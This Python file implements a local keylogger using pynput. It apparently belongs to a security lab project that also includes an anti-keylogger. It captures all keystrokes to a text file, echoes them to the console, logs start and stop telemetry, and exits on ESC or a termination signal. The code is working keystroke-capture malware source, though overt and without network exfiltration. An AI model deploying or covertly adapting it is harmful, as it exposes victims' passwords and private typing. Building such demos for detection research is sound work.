import pynput.keyboard
from pynput.keyboard import Key
import sys
import signal
import logging
import time
import json

LOG_FILE = "[keylogger]_keylog_dump.txt"
TELEMETRY = "project_telemetry.log"

# Dedicated file logger for TELEMETRY
tele = logging.getLogger("KEYLOGGER")
tele.setLevel(logging.INFO)
if not tele.handlers:
    fh = logging.FileHandler(TELEMETRY)
    fh.setFormatter(logging.Formatter("%(asctime)s - %(name)s - %(message)s"))
    tele.addHandler(fh)
tele.propagate = False

def _log_event(event_type, details):
    payload = {"module": "KEYLOGGER", "event_type": event_type, "details": details}
    tele.info(json.dumps(payload))

class LocalKeylogger:
    def __init__(self):
        self.last_key = None
        self.last_ts = 0
        self.listener = None
        self.terminated = False
        
        # Register signal handler for graceful termination (Phase 5 anti-keylogger)
        signal.signal(signal.SIGTERM, self._handle_termination)
        signal.signal(signal.SIGINT, self._handle_termination)

    def _handle_termination(self, signum, frame):
        """Called when process is killed by Phase 5 anti-keylogger."""
        self.terminated = True
        print("\n[*] Keylogger terminated by external signal.")
        _log_event("TERMINATED", {"reason": "External signal", "signal": signum})
        if self.listener:
            self.listener.stop()
        sys.exit(0)

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            # Handle special keys
            if key == Key.space:
                current_key = " "
            elif key == Key.enter:
                current_key = "\n"
            elif key == Key.backspace:
                current_key = "[BS]"
            elif key == Key.esc:
                # ESC key pressed - stop the keylogger
                print("\n[*] ESC pressed. Stopping Keylogger...")
                _log_event("STOPPED", {"reason": "ESC key pressed"})
                return False
            else:
                current_key = f"[{str(key)}]"

        # Debounce repeated keys
        ts = time.time()
        if current_key == self.last_key and (ts - self.last_ts) < 0.05:
            return
        self.last_key, self.last_ts = current_key, ts

        # Output to console
        sys.stdout.write(current_key)
        sys.stdout.flush()
        
        # Write to log file
        try:
            with open(LOG_FILE, "a") as f:
                f.write(current_key)
        except Exception:
            pass

    def start(self):
        print("\n[+] --- LOCAL KEYLOGGER STARTED ---")
        print(f"[*] Saving keystrokes to '{LOG_FILE}'. Press ESC to stop.")
        _log_event("STARTED", {"output_file": LOG_FILE})
        
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            self.listener = listener
            listener.join()
        
        print("[*] Keylogger stopped.")

if __name__ == "__main__":
    LocalKeylogger().start()
